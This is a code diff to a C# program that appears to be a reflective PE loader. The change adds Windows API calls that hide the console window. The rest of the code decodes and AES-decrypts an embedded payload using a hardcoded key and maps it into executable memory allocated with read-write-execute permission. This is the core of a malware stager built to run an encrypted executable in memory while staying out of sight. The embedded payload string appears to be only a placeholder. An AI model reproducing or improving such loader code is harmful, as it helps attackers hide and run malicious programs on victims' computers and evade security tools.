@@ -14,13 +14,27 @@ namespace Default {
 		private static String key = "73c5c318c201b8561160db079a864d9d";
 		private static String encryptedStringWithIV = "VGhpcyBpcyBhbiBJVjEyM6rf";
 		
+		// hide window
+		[DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        const int SW_HIDE = 0;
+        const int SW_SHOW = 5;
+		
 		public static void Main() {
+		
+            // hide window
+            var windowHandle = GetConsoleWindow();
+            ShowWindow(windowHandle, SW_HIDE);
+            
+            // decode / decrypt payload
 			byte[] bytes = System.Convert.FromBase64String(encryptedStringWithIV);
-			bytes = decryptStringFromBytes_Aes(bytes.Skip(16).ToArray(), System.Text.Encoding.ASCII.GetBytes(key), bytes.Take(16).ToArray());			
+			bytes = decryptStringFromBytes_Aes(bytes.Skip(16).ToArray(), System.Text.Encoding.ASCII.GetBytes(key), bytes.Take(16).ToArray());
+			
+			
 			PELoader pe = new PELoader(bytes);
-
             //Console.WriteLine("Preferred Load Address = {0}", pe.OptionalHeader64.ImageBase.ToString("X4"));
-
             IntPtr codebase = IntPtr.Zero;
             codebase = NativeDeclarations.VirtualAlloc(IntPtr.Zero, pe.OptionalHeader64.SizeOfImage, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
             //Console.WriteLine("Allocated Space For {0} at {1}", pe.OptionalHeader64.SizeOfImage.ToString("X4"), codebase.ToString("X4"));
